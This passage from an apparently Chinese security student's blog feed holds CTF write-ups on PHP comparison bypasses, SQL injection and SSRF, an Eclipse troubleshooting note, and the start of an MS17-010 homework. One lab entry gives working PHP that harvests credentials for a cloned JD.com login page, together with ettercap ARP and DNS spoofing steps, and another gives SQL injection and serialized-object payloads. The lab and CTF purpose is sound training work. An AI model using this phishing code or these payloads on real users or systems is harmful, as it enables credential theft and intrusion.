<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aa3OFF9m'</span>)</span></span></code></pre></div>

<p>payload:</p>
<div class="hljs"><pre><code class="hljs routeros">GET:
?<span class="hljs-attribute">a</span>=240610708</code></pre></div>



<h2 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">noother_says_correct</span><span class="hljs-params">($temp)</span></span>
<span class="hljs-function"></span>&#123;
$flag = <span class="hljs-string">'flag&#123;test&#125;'</span>;
$one = ord(<span class="hljs-string">'1'</span>); <span class="hljs-comment">//ord — 返回字符的 ASCII 码值</span>
$nine = ord(<span class="hljs-string">'9'</span>); <span class="hljs-comment">//ord — 返回字符的 ASCII 码值</span>
$number = <span class="hljs-string">'3735929054'</span>;
<span class="hljs-comment">// Check all the input characters!</span>
<span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; strlen($number); $i++)
&#123;
<span class="hljs-comment">// Disallow all the digits!</span>
$digit = ord($temp&#123;$i&#125;);
<span class="hljs-keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )
&#123;
<span class="hljs-comment">// Aha, digit not allowed!</span>
<span class="hljs-keyword">return</span> <span class="hljs-string">"flase"</span>;
&#125;
&#125;
<span class="hljs-keyword">if</span>($number == $temp)
<span class="hljs-keyword">return</span> $flag;
&#125;
$temp = $_GET[<span class="hljs-string">'password'</span>];
<span class="hljs-keyword">echo</span> noother_says_correct($temp);
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>重点在这段代码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )
&#123;
<span class="hljs-comment">// Aha, digit not allowed!</span>
<span class="hljs-keyword">return</span> <span class="hljs-string">"flase"</span>;
&#125;
&#125;
<span class="hljs-keyword">if</span>($number == $temp)
<span class="hljs-keyword">return</span> $flag;
&#125;</code></pre></div>

<p>输入的数字中不能包含1-9的数字</p>
<p>如果输入的数字和相等则拿到flag</p>
<p>可以想到的是将这段数字转换为十六进制</p>
<div class="hljs"><pre><code class="hljs angelscript">hex(<span class="hljs-number">3735929054</span>)=<span class="hljs-number">0xdeadc0de</span>

GET:
password=<span class="hljs-number">0xdeadc0de</span></code></pre></div>

<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>网址打不开</p>
<h2 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$flag = <span class="hljs-string">"xxx"</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ($_GET[<span class="hljs-string">'password'</span>]))
&#123;
	<span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="hljs-string">'password'</span>]) === <span class="hljs-keyword">FALSE</span>)
	&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'You password must be alphanumeric'</span>;
	&#125;
	<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strlen($_GET[<span class="hljs-string">'password'</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; $_GET[<span class="hljs-string">'password'</span>] &gt; <span class="hljs-number">9999999</span>)
	&#123;
		<span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'password'</span>], <span class="hljs-string">'-'</span>) !== <span class="hljs-keyword">FALSE</span>) <span class="hljs-comment">//strpos — 查找字符串首次出现的位置</span>
		&#123;
			<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span> . $flag);
		&#125;
	<span class="hljs-keyword">else</span>
	&#123;
		<span class="hljs-keyword">echo</span>(<span class="hljs-string">'- have not been found'</span>);
	&#125;
&#125;
<span class="hljs-keyword">else</span>
&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'Invalid password'</span>;
&#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>绕过三个if语句即可拿到flag</p>
<p>第一个</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="hljs-string">'password'</span>]) === <span class="hljs-keyword">FALSE</span>)</code></pre></div>

<p>这个比较常见的正则表达式，也很容易理解</p>
<p><code>[a-zA-Z0-9]+</code>包含大小写字符和数字，^是匹配开始标志，$是匹配结束标志</p>
<p>第二个</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (strlen($_GET[<span class="hljs-string">'password'</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; $_GET[<span class="hljs-string">'password'</span>] &gt; <span class="hljs-number">9999999</span>)</code></pre></div>

<p>password字段长度小于8，但是大于9999999，可以使用科学计数法</p>
<p>第三个</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'password'</span>], <span class="hljs-string">'-'</span>) !== <span class="hljs-keyword">FALSE</span>)</code></pre></div>

<p>password要包含 <code>-</code>（做题的时候会发现应该是<code>*-*</code>）</p>
<p>payload</p>
<div class="hljs"><pre><code class="hljs angelscript">GET:
password=<span class="hljs-number">1e9</span>%<span class="hljs-number">00</span>*-*</code></pre></div>

<p><img src="https://i.loli.net/2020/11/28/xcjep86YFtWgXMk.png" srcset="/img/loading.gif" alt="zhengze.png"></p>
<h2 id="strpos数组绕过"><a href="#strpos数组绕过" class="headerlink" title="strpos数组绕过"></a>strpos数组绕过</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$flag = <span class="hljs-string">"flag"</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ($_GET[<span class="hljs-string">'ctf'</span>])) &#123;
<span class="hljs-keyword">if</span> (@ereg (<span class="hljs-string">"^[1-9]+$"</span>, $_GET[<span class="hljs-string">'ctf'</span>]) === <span class="hljs-keyword">FALSE</span>)
<span class="hljs-keyword">echo</span> <span class="hljs-string">'必须输入数字才行'</span>;
<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'ctf'</span>], <span class="hljs-string">'#biubiubiu'</span>) !== <span class="hljs-keyword">FALSE</span>)
<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);
<span class="hljs-keyword">else</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">'骚年，继续努力吧啊~'</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>直接利用ereg和strpos函数不能处理数组的特性绕过</p>
<p>当输入ctf[]=11时，ereg返回值null!==FALSE</p>
<p>strpos返回值也为null!=FALSE</p>
<p>拿到flag</p>
<p>payload：</p>
<div class="hljs"><pre><code class="hljs angelscript">GET:
?ctf[]=<span class="hljs-number">111</span>
<span class="hljs-comment">//正常做法</span>
?nctf=<span class="hljs-number">1</span>%<span class="hljs-number">00</span>%<span class="hljs-number">23</span>biubiubiu</code></pre></div>

<h2 id="数字验证正则绕过"><a href="#数字验证正则绕过" class="headerlink" title="数字验证正则绕过"></a>数字验证正则绕过</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
$flag = <span class="hljs-string">'flag&#123;test&#125;'</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-string">"POST"</span> == $_SERVER[<span class="hljs-string">'REQUEST_METHOD'</span>])
&#123;
$password = $_POST[<span class="hljs-string">'password'</span>];
<span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> &gt;= preg_match(<span class="hljs-string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, $password)) <span class="hljs-comment">//preg_match — 执行一个正则表达式匹配 长度大于12</span>
&#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">'flag'</span>;<span class="hljs-comment">//这里输出的是假flag 真的在下面</span>
<span class="hljs-keyword">exit</span>;
&#125;
<span class="hljs-keyword">while</span> (<span class="hljs-keyword">TRUE</span>)
&#123;
$reg = <span class="hljs-string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-number">6</span> &gt; preg_match_all($reg, $password, $arr))
<span class="hljs-keyword">break</span>;
$c = <span class="hljs-number">0</span>;
$ps = <span class="hljs-keyword">array</span>(<span class="hljs-string">'punct'</span>, <span class="hljs-string">'digit'</span>, <span class="hljs-string">'upper'</span>, <span class="hljs-string">'lower'</span>); 
  <span class="hljs-comment">//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span>
<span class="hljs-keyword">foreach</span> ($ps <span class="hljs-keyword">as</span> $pt)
&#123;
<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/[[:$pt:]]+/"</span>, $password))
$c += <span class="hljs-number">1</span>;
&#125;
<span class="hljs-keyword">if</span> ($c &lt; <span class="hljs-number">3</span>) <span class="hljs-keyword">break</span>;
<span class="hljs-comment">//&gt;=3，必须包含四种类型三种与三种以上</span>
<span class="hljs-keyword">if</span> (<span class="hljs-string">"42"</span> == $password) <span class="hljs-keyword">echo</span> $flag;
<span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">'Wrong password'</span>;
<span class="hljs-keyword">exit</span>;
&#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>



<p>代码还挺长，但是直接抓住重点</p>
<div class="hljs"><pre><code class="hljs lisp">if (<span class="hljs-number">0</span> &gt;= preg_match('/^[[<span class="hljs-symbol">:graph</span>:]]&#123;<span class="hljs-number">12</span>,&#125;$/', $password))</code></pre></div>

<p>[:graph]是所有可打印的字符,{12,},是在password中匹配12次以上，即password的长度大于12</p>
<p>下面的正则</p>
<div class="hljs"><pre><code class="hljs php">$ps = <span class="hljs-keyword">array</span>(<span class="hljs-string">'punct'</span>, <span class="hljs-string">'digit'</span>, <span class="hljs-string">'upper'</span>, <span class="hljs-string">'lower'</span>); 
  <span class="hljs-comment">//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span>
<span class="hljs-keyword">foreach</span> ($ps <span class="hljs-keyword">as</span> $pt)
&#123;
<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/[[:$pt:]]+/"</span>, $password))
$c += <span class="hljs-number">1</span>;
&#125;</code></pre></div>

<p>要求password中必须包含三种以上的类型的字符，于是正常构造如下的payload</p>
<div class="hljs"><pre><code class="hljs angelscript">POST:
password=<span class="hljs-number">42</span>adad;d;;a

<span class="hljs-comment">//非正常的</span>
password=<span class="hljs-number">42</span>%<span class="hljs-number">00</span>
或者POST一个任意不等于password的字符
暂时不知道什么原因导致的</code></pre></div>

<p><img src="https://i.loli.net/2020/11/28/euJc6DPKCZ4a5bY.png" srcset="/img/loading.gif" alt="shuzi2.png"></p>
<p><img src="https://i.loli.net/2020/11/28/HwsChaXMRFWmjeA.png" srcset="/img/loading.gif" alt="shuzi1.png"></p>
<h2 id="简单waf"><a href="#简单waf" class="headerlink" title="简单waf"></a>简单waf</h2><p>网址打不开</p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>变量覆盖</tag>
        <tag>函数漏洞</tag>
        <tag>绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>diaoyu</title>
    <url>/2020/07/18/diaoyu/</url>
    <content><![CDATA[<h1 id="DNS欺骗、ARP攻击及钓鱼网站制作"><a href="#DNS欺骗、ARP攻击及钓鱼网站制作" class="headerlink" title="DNS欺骗、ARP攻击及钓鱼网站制作"></a>DNS欺骗、ARP攻击及钓鱼网站制作</h1><a id="more"></a>
<p>1.实验目的<br>获取登录jd网页的用户名和密码<br>2.实验主机<br>一台kali,两台win2003,其中一台为客户机，一台为服务器，kali作为攻击者<br>3.实验材料<br>京东登录网页及其所有图片（浏览器访问<a href="https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F" target="_blank" rel="noopener">https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F</a> 之后保存网页即可）<br><img src="/2020/07/18/diaoyu/9.png" srcset="/img/loading.gif" alt><br>修改index.html中的内容<br><img src="/2020/07/18/diaoyu/10.png" srcset="/img/loading.gif" alt><br>error.php中的内容如下<br>关键代码（用于保存用户名和密码以及迷惑用户）</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$nam = stripslashes($_POST[<span class="hljs-string">'name'</span>]); <span class="hljs-comment">//name 是由网页的表单信息决定，不同的网页对应不同的内容，这一点很重要</span>
$pas = stripslashes($_POST[<span class="hljs-string">'pass'</span>]);<span class="hljs-comment">//pass也一样</span>
$content = <span class="hljs-string">"您已捕获京东账号及密码1个："</span> . <span class="hljs-string">" 用户名 "</span> . $nam . <span class="hljs-string">" 密码 "</span> . $pas;   <span class="hljs-comment">//保存捕获的用户名和密码</span>
$filed = @fopen(<span class="hljs-string">"1.txt"</span>, <span class="hljs-string">"a+"</span>);   <span class="hljs-comment">//打开1.txt</span>
@fwrite($filed, <span class="hljs-string">"$content\n"</span>);     <span class="hljs-comment">//将用户名和密码写入1.txt</span>
<span class="hljs-meta">?&gt;</span>
&lt;html&gt;
&lt;head&gt;
&lt;script type=<span class="hljs-string">"text/javascript"</span>&gt;
		<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">goBack</span><span class="hljs-params">()</span></span>
<span class="hljs-function">		</span>&#123;
			window.history.back() <span class="hljs-comment">//后退+刷新</span>
		&#125;
&lt;/script&gt;
&lt;/head&gt;
&lt;body onload=<span class="hljs-string">"goBack()"</span>&gt; &lt;!-- 加载之后立即执行一段 JavaScript --&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre></div>
<p>4.实验拓扑图<br><img src="/2020/07/18/diaoyu/tuopu.png" srcset="/img/loading.gif" alt></p>
<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="一-部署京东的服务器"><a href="#一-部署京东的服务器" class="headerlink" title="一.部署京东的服务器"></a>一.部署京东的服务器</h3><p>1.安装DNS和web服务器（具体步骤略）<br>2.配置DNS服务器<br>a.在正向解析中建一个区域名字为jd ip为服务器地址（10.1.1.1）<br>b.在jd域中新建一台主机  <a href="http://www.jd.com" target="_blank" rel="noopener">www.jd.com</a>    ip:10.1.1.1</p>
<p>2.IIS<br>a.将默认网站停止<br>b.新建网站jd.com,文件路径为保存的jd网页<br>c.打开web服务中的asp（因为此网站不是静态网站）<br><img src="/2020/07/18/diaoyu/1.png" srcset="/img/loading.gif" alt><br>（使用2003客户机访问<a href="http://www.jd.com看看网站发布是否成功）" target="_blank" rel="noopener">www.jd.com看看网站发布是否成功）</a></p>
<h3 id="二-部署kali"><a href="#二-部署kali" class="headerlink" title="二.部署kali"></a>二.部署kali</h3><p>1.将钓鱼网页的所有文件放到 kali 的/var/www/html/路径下， 并修改 1.txt 的权限， 使这个文档可以写入数据。<br><img src="/2020/07/18/diaoyu/2.png" srcset="/img/loading.gif" alt><br>2.开启apache服务，并检查80端口是否已开启<br><code>systemctl start apache2</code><br><code>netstat -antpl</code><br><img src="/2020/07/18/diaoyu/3.png" srcset="/img/loading.gif" alt><br>3.修改DNS欺骗配置文件，使用 vim 编辑器， 命令：vim /etc/ettercap/etter.dns，然后 添加一条 A 记录，<br>添加一条 PTR 记录，使用户访问<a href="http://www.jd.com，指向为10.1.1.2" target="_blank" rel="noopener">www.jd.com，指向为10.1.1.2</a><br>  <img src="/2020/07/18/diaoyu/4.png" srcset="/img/loading.gif" alt><br><code>选中一行后，按两次d可删除内容</code><br><code>想要编辑时，先按i(insert)</code><br><code>编辑结束后  :wq 保存</code><br>4.打开ettercap软件<br>5.选择sniff–unified sniffing，并选择监听eth0<br>6.然后选择Hosts——Scan for hosts–扫描完成后选择Hosts——Hosts list,可以看到扫描到的主机<br>7.添加欺骗记录<br>选中10.1.1.1，点击Add to Target 1 选中10.1.1.3，点击Add to Target 2<br>8.在Mitm选择ARP欺骗<br><img src="/2020/07/18/diaoyu/5.png" srcset="/img/loading.gif" alt><br>在弹出的窗口中，勾选第一个点击确定<br><img src="/2020/07/18/diaoyu/6.png" srcset="/img/loading.gif" alt><br>9.选择plugins – Manage the plugins，准备进行DNS欺骗<br>在弹出的窗口中， 找到 dns spoof 并双击出现*号，开始DNS欺骗</p>
<h3 id="三-用户访问登录页面"><a href="#三-用户访问登录页面" class="headerlink" title="三.用户访问登录页面"></a>三.用户访问登录页面</h3><p>1.在客户机中在中，再次登录<a href="http://www.jd.com输入用户名密码等，如图，然后点击登录" target="_blank" rel="noopener">www.jd.com输入用户名密码等，如图，然后点击登录</a><br><img src="/2020/07/18/diaoyu/7.png" srcset="/img/loading.gif" alt><br>2.在kali虚拟机中，已经钓鱼成功，并钓到京东的登录账户及密码(cat 1.txt)<br><img src="/2020/07/18/diaoyu/8.png" srcset="/img/loading.gif" alt></p>
]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title>google搜索引擎&amp;eclipse启动问题</title>
    <url>/2020/11/02/eclipse%E5%90%AF%E5%8A%A8%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>谷歌搜索引擎前两天突然无法搜索东西但是可以继续访问YouTube，就**离谱。</p>
<p>由于课程原因需要学习java，今天就下载了一个Java常用的编辑器eclipse，但是启动时给我一个弹窗，版本不一致。</p>
<a id="more"></a>

<h1 id="google浏览器"><a href="#google浏览器" class="headerlink" title="google浏览器"></a>google浏览器</h1><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>Google浏览器可以访问外网，但是无法使用搜索引擎搜东西，每次显示无法连接<a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a></p>
<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>一开始想着卸载重装，发现还是不行，后来换成了测试版本结果真能用，但是两天没到又出现那种情况，很无语</p>
<p>想着应该是google.com被屏蔽了，试着清除dns缓存</p>
<div class="hljs"><pre><code class="hljs dos"><span class="hljs-built_in">ipconfig</span> /flushdns</code></pre></div>

<p>还是不行，直接释放ip重新申请</p>
<div class="hljs"><pre><code class="hljs dos"><span class="hljs-built_in">ipconfig</span> /release
<span class="hljs-built_in">ipconfig</span> /renew</code></pre></div>

<p>然后就可以用了。。</p>
<p>（几个小时过去了就他妈不能用了，真尼玛离谱）</p>
<h1 id="eclipse问题"><a href="#eclipse问题" class="headerlink" title="eclipse问题"></a>eclipse问题</h1><h2 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h2><p>弹窗内容</p>
<p>Version 1.8.0_271 of the JVM is not suitable for this product.Version: 11or greater is required.</p>
<p>JVM的1.8.0_271版本不适合此产品。版本：11或更高版本是必需的。</p>
<p>大概意思就是当前的jvm版本与软件不相容</p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><h3 id="1-找到java安装的路径"><a href="#1-找到java安装的路径" class="headerlink" title="1.找到java安装的路径"></a>1.找到java安装的路径</h3><p>默认安装是下面这个路径</p>
<div class="hljs"><pre><code class="hljs fortran">C:\<span class="hljs-function"><span class="hljs-keyword">Program</span></span> Files\Java\</code></pre></div>

<p>找到</p>
<div class="hljs"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\J</span>ava<span class="hljs-symbol">\j</span>re1.8.0_271<span class="hljs-symbol">\b</span>in<span class="hljs-symbol">\j</span>avaw.exe</code></pre></div>



<h3 id="2-打开eclipse的安装路径，打开eclipse-ini"><a href="#2-打开eclipse的安装路径，打开eclipse-ini" class="headerlink" title="2.打开eclipse的安装路径，打开eclipse.ini"></a>2.打开eclipse的安装路径，打开eclipse.ini</h3><p>修改成下面这样</p>
<div class="hljs"><pre><code class="hljs stylus">-startup
plugins/org<span class="hljs-selector-class">.eclipse</span><span class="hljs-selector-class">.equinox</span><span class="hljs-selector-class">.launcher_1</span>.<span class="hljs-number">5.800</span><span class="hljs-selector-class">.v20200727-1323</span>.jar
--launcher.library
plugins/org<span class="hljs-selector-class">.eclipse</span><span class="hljs-selector-class">.equinox</span><span class="hljs-selector-class">.launcher</span><span class="hljs-selector-class">.win32</span><span class="hljs-selector-class">.win32</span><span class="hljs-selector-class">.x86_64_1</span>.<span class="hljs-number">1.1300</span>.v20200819-<span class="hljs-number">0940</span>
-product
org<span class="hljs-selector-class">.eclipse</span><span class="hljs-selector-class">.epp</span><span class="hljs-selector-class">.package</span><span class="hljs-selector-class">.java</span>.product
-showsplash
org<span class="hljs-selector-class">.eclipse</span><span class="hljs-selector-class">.epp</span><span class="hljs-selector-class">.package</span>.common
--launcher.defaultAction
openFile
--launcher.defaultAction
openFile
--launcher.appendVmargs
-vm                                               <span class="hljs-comment">//这两行</span>
C:\Program Files\Java\jre1.<span class="hljs-number">8.0</span>_271\bin\javaw<span class="hljs-selector-class">.exe</span>  <span class="hljs-comment">//是添加的</span>
-vmargs
-Dosgi.requiredJavaVersion=<span class="hljs-number">1.8</span>                    <span class="hljs-comment">//这里改为jdk版本号</span>
-Dosgi<span class="hljs-selector-class">.instance</span><span class="hljs-selector-class">.area</span>.default=@user.home/eclipse-workspace
-XX:+UseG1GC
-XX:+UseStringDeduplication
--add-modules=ALL-SYSTEM
-Dosgi.requiredJavaVersion=<span class="hljs-number">1.8</span>					  <span class="hljs-comment">//这里也一样</span>
-Dosgi.dataAreaRequiresExplicitInit=true
-Xms256m
-Xmx2048m
--add-modules=ALL-SYSTEM</code></pre></div>

<p>保存后成功启动。</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>fakebook</title>
    <url>/2020/09/27/fakebook/</url>
    <content><![CDATA[<h1 id="攻防世界-fakebook"><a href="#攻防世界-fakebook" class="headerlink" title="攻防世界-fakebook"></a>攻防世界-fakebook</h1><p>感觉挺有意思的一道题，所以记录一下吧</p>
<a id="more"></a>

<h2 id="0x01发现注入点"><a href="#0x01发现注入点" class="headerlink" title="0x01发现注入点"></a>0x01发现注入点</h2><p>进入网页发现是一个博客页面，先随便注册一个账号登录上去看看，发现了一个貌似可以注入的地方</p>
<p><code>http://220.249.52.133:44224/view.php?no=1</code>参数no这里应该是一个数字型的注入点，测试一下。</p>
<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=1</code>显示是正常的，但是</p>
<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=2</code>网页报错，确定了就是数字型注入</p>
<p>接下来继续注入的常规操作。</p>
<p><code>http://220.249.52.133:44224/view.php?no=-2 order by 4#</code>时页面显示正常，并提示了网站的根目录</p>
<p><img src="/2020/09/27/fakebook/order.png" srcset="/img/loading.gif" alt></p>
<p>但是当 order by 5 # 时，网页报错，确定是四列。</p>
<p><strong>爆表名</strong></p>
<p>本以为会顺利的爆破出来，但是提示了 hacker ，这里可能存在黑名单检测</p>
<p><img src="/2020/09/27/fakebook/waf.png" srcset="/img/loading.gif" alt="waf"></p>
<p>试了试双写绕过，发现继续提示hack，再试试用/**/替换空格，这次居然可以了，暂且当它是禁了空格。这里还出现一个提示</p>
<p><strong>Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31</strong> 提示存在反序列化，但是不知道怎么用继续爆表。</p>
<p><img src="/2020/09/27/fakebook/%E5%9B%9E%E6%98%BE.png" srcset="/img/loading.gif" alt></p>
<p><code>?no=-2/**/union/**/select/**/1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4#</code></p>
<p><code>?no=-2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;#</code></p>
<p>爆出一大堆列名。直接读取data的内容</p>
<p><strong>no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</strong></p>
<p><code>?no=-2 union/**/select 1,(select data from users),3,4 #</code></p>
<p>发现内容是注册时信息保存为序列化内容</p>
<p>O:8:”UserInfo”:3:{s:4:”name”;s:5:”sunzy”;s:3:”age”;i:22;s:4:”blog”;s:12:”22.github.io”;}</p>
<p>到这里就不知道怎么办了。。。</p>
<h2 id="0x02审计源码"><a href="#0x02审计源码" class="headerlink" title="0x02审计源码"></a>0x02审计源码</h2><p>扫描一下目录发现了robots.txt，其中给出来了源码备份文件的路径</p>
<p><img src="/2020/09/27/fakebook/robots.png" srcset="/img/loading.gif" alt></p>
<p>源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span>   //<span class="hljs-title">user</span>信息类</span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">""</span>;
    <span class="hljs-keyword">public</span> $age = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">public</span> $blog = <span class="hljs-string">""</span>;
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($name, $age, $blog)</span></span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-keyword">$this</span>-&gt;name = $name;
    <span class="hljs-keyword">$this</span>-&gt;age = (int)$age;
    <span class="hljs-keyword">$this</span>-&gt;blog = $blog;
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span><span class="hljs-params">($url)</span> // 处理<span class="hljs-title">url</span></span>
<span class="hljs-function"></span>&#123;
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
    $output = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    <span class="hljs-keyword">if</span>($httpCode == <span class="hljs-number">404</span>) &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;
    &#125;
    curl_close($ch);

    <span class="hljs-keyword">return</span> $output;
&#125;

<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> <span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);
&#125;

<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> <span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
    $blog = <span class="hljs-keyword">$this</span>-&gt;blog;
    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);
&#125;
&#125;</code></pre></div>
<p>审计源码发现其中get()函数存在SSRF(服务端请求伪造)漏洞。</p>
<p><strong>思路：利用no参数进行注入，在反序列化中构造file文件协议，利用服务端请求伪造漏洞访问服务器上的flag.php文件。</strong></p>
<div class="hljs"><pre><code class="hljs groovy">?no=-2%20union/**/select%201,2,3,'O:<span class="hljs-number">8</span>:<span class="hljs-string">"UserInfo"</span>:<span class="hljs-number">3</span>:&#123;<span class="hljs-string">s:</span><span class="hljs-number">4</span>:<span class="hljs-string">"name"</span>;<span class="hljs-string">s:</span><span class="hljs-number">5</span>:<span class="hljs-string">"sunzy"</span>;<span class="hljs-string">s:</span><span class="hljs-number">3</span>:<span class="hljs-string">"age"</span>;<span class="hljs-string">i:</span><span class="hljs-number">22</span>;<span class="hljs-string">s:</span><span class="hljs-number">4</span>:<span class="hljs-string">"blog"</span>;<span class="hljs-string">s:</span><span class="hljs-number">29</span>:<span class="hljs-string">"file:///var/www/html/flag.php"</span>;&#125;<span class="hljs-string">'%20#</span></code></pre></div>

<p>查看源码，解base64。</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>unserailize</tag>
      </tags>
  </entry>
  <entry>
    <title>网安作业1</title>
    <url>/2020/09/27/homework/</url>
    <content><![CDATA[<h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><a id="more"></a>

<h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h2><p>开启两台虚拟机，一台kali作为攻击方，一台win7作为被攻击方</p>
<p>将两台虚拟机桥接到同一网卡，并保证能够通信</p>
<p>Kali IP 10.1.1.1  255.0.0.0  win7 IP　10.1.1.2  255.0.0.0</p>
<p>测试两台主机之间的通信情况</p>
<p><img src="/2020/09/27/homework/1.png" srcset="/img/loading.gif" alt></p>
<p><img src="/2020/09/27/homework/2.png" srcset="/img/loading.gif" alt> </p>
<p>使用msf前需要开启postgresql服务 </p>
<p>开启服务：service postgresql start </p>
<p>查看服务状态：service postgresql status</p>
<p>开到绿色字体的active即为开启了</p>
<p>初始化数据库：msfdb init </p>
<p><img src="/2020/09/27/homework/3.png" srcset="/img/loading.gif" alt> </p>
